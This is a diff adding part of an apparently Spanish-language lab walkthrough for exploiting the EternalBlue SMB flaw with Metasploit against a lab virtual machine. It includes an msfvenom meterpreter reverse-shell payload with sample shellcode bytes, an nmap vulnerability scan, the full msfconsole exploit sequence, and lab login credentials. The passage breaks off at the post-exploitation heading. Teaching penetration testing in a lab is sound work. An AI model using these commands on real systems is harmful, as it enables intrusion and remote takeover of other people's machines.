@@ -115,5 +115,58 @@ El comando **info** permite consultar la información del módulo antes de ejecu
     Also known as:
     ETERNALBLUE
 
-
     View the full module info with the info -d command.
+
+Para ver dónde vive el archivo Ruby en Kali:
+
+    INPUT: locate ms17_010_eternalblue.rb  
+    OUTPUT: /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb
+
+Vista de la terminal:
+![F1.2](/assets/KILL3/F1.2.png)
+
+Para visualizar cómo Metasploit construye el payload utilizando los parámetros previamente configurados, se ingresa el siguiente comando en la terminal.
+    
+    INPUT en Kali:
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.9 LPORT=4444 -f hex 2>/dev/null | head -c 160
+    
+    OUTPUT: primeros bytes del shellcode generado
+    fc4883e4f0e8cc0000004151415052514831d25665488b5260488b5218488b52204d31c9480fb74a4a488b72504831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178    
+
+Vista del **LHOST** de la guía de laboratorio **(10.0.2.9)** y LHOST del usuario real **(10.0.2.3)**, respectimante:
+
+![F1.3](/assets/KILL3/F1.3.png)
+![F1.4](/assets/KILL3/F1.4.png)
+
+**NOTA:** El valor LHOST=10.0.2.9 **(Según la IP de nuestra MV: LHOST=10.0.2.3)** y **LPORT=4444** se incorporan al payload durante su generación. Esto permite que, cuando el exploit se ejecute en la máquina víctima, el payload establezca una conexión de regreso hacia la máquina atacante a través del puerto 4444. Si se modifica el valor de LHOST, Metasploit debe generar un nuevo payload, ya que la dirección IP forma parte del código que se ejecutará en la víctima.
+
+# Paso 1: Confirmar la vulnerabilidad
+
+Se comprueba si la máquina víctima presenta vulnerabilidades antes de realizar la explotación.
+Para la verificación tener en cuenta la contraseña para el ingreso que solicita **"sudo"**, ya que está pidiendo la contraseña del usuario de Kali Linux con el que se inició sesión. Siendo en Kali:
+
+    USUARIO: user
+    CONTRASEÑA: user123
+
+    Comando utilizado:
+    sudo nmap --script vuln -p 445 10.0.2.15
+
+Output esperado:
+![F1.5](/assets/KILL3/F1.5.png)
+
+# Paso 2: Explotar con Metasploit
+
+Comando ingresado para la explotación:
+
+    msfconsole -q
+    use exploit/windows/smb/ms17_010_eternalblue
+    set RHOSTS 10.0.2.15
+    set LHOST 10.0.2.3   (IP del lab guía: 10.0.2.9)
+    set payload windows/x64/meterpreter/reverse_tcp
+    run
+
+Output esperado:
+![F1.6](/assets/KILL3/F1.6.png)
+
+# Paso 3: Post-Explotación con Meterpreter
+
